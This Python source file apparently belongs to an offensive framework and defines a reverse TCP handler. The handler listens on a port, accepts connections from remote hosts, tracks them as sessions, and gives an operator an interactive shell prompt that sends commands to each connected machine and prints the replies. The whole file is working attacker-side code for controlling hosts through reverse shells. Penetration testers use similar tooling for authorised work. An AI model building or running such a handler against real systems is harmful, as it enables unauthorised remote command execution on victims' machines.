import socket
import threading
import logging
from lib.int4.handler.base import HandlerBase

class ReverseTCPHandler(HandlerBase):
    option_schema = {
        "host": {"description": "Bind address", "required": True},
        "port": {"description": "Bind port", "required": True},
        "timeout": {"description": "Socket timeout", "required": False, "default": 5},
    }

    def __init__(self):
        super().__init__()
        self.server_socket = None

    def start(self):
        self._running = True
        host = self.get_option("host")
        port = int(self.get_option("port"))
        timeout = int(self.get_option("timeout") or 5)

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((host, port))
        self.server_socket.listen(5)
        self.server_socket.settimeout(timeout)

        logging.info(f"[ReverseTCPHandler] Listening on {host}:{port}")

        while self._running:
            try:
                client_sock, addr = self.server_socket.accept()
                logging.info(f"[ReverseTCPHandler] Connection from {addr}")

                session = self.session_manager.create_session(
                    type="reverse_tcp",
                    host=addr[0],
                    description="Reverse TCP session",
                    socket=client_sock,
                )

                t = threading.Thread(target=self.handle_session, args=(session,))
                t.daemon = True
                t.start()
            except socket.timeout:
                continue
            except Exception as e:
                logging.error(f"[ReverseTCPHandler] Accept error: {e}")
                break

    def handle_session(self, session):
        sock = session.socket
        try:
            while self._running and session.active:
                cmd = input(f"shell@{session.host}# ")
                if cmd.strip().lower() in ("exit", "quit"):
                    sock.send(b"exit\n")
                    break
                sock.send(cmd.encode() + b"\n")
                data = sock.recv(4096)
                print(data.decode(errors="ignore"))
        except Exception as e:
            logging.error(f"[ReverseTCPHandler] Session error: {e}")
        finally:
            self.session_manager.close_session(session.id)

    def stop(self):
        self._running = False
        if self.server_socket:
            self.server_socket.close()